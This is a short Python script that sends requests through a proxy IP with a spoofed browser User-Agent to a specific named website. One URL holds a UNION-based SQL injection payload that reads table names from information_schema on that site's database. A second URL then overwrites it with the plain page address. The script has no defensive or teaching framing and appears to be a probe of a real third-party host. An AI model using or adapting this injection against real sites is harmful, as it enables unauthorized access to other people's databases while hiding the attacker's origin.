import urllib
import time
import gevent
from tqdm import tqdm
from PIL import Image
from bs4 import BeautifulSoup
from gevent import monkey

monkey.patch_socket()

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Content-Type': 'application/json'
}
def transferOpener(ip_list):
    openers = []
#     raw_opener = urllib.request.build_opener()
#     raw_opener.addheaders = [('User-agent', headers['User-Agent']), ('Content-Type', headers['Content-Type'])]
    # double local requester
    #openers.append(raw_opener)
#     openers.append(raw_opener)
    
    for ip_proxy in ip_list:
        proxies = {'http': ip_proxy, 'https': ip_proxy}  
        proxy_handler = urllib.request.ProxyHandler(proxies)     
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [('User-Agent', headers['User-Agent']), ('Content-Type', headers['Content-Type'])]
        openers.append(opener)
    print('Transfer %d openers.' % len(openers))
    return openers

openers = transferOpener(['117.69.28.233:9999'])

url = "http://188.hnqymy.net/goem.php?newsid=16261733093%20union%20all%20select%201,database(),table_name,4%20from%20information_schema.tables%20where%20table_schema=%27www91ytxcom%27"
url = "http://188.hnqymy.net/goem.php?newsid=16261733093"
request = urllib.request.Request(url,headers=headers)

response = openers[0].open(request)
html = response.read()
print(html)

page = BeautifulSoup(html)
print(page)